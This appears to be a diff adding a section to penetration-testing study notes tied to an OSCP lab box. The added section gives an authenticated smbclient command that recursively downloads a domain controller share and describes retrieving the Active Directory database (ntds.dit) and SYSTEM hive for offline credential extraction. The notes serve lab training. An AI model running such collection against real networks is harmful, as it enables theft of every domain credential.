@@ -138,3 +138,15 @@ This page turns one repeatable part of an authorized assessment into a checklist
 ## Demonstrated in box write-ups
 
 - [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
+
+## Fermion: recursive authenticated SMB collection
+
+```bash
+# Run from the destination so nested remote paths stay in private loot.
+cd $BoxDir/loot/extract
+smbclient //$DCip/extract \
+  -U "$Domain/$Username2%$Password2" \
+  -c 'recurse ON; prompt OFF; mget *'
+```
+
+This collected the AD database and registry material from the readable `extract` share. Preserve the directory layout because the matching SYSTEM hive must be paired with the correct `ntds.dit` file during offline parsing.
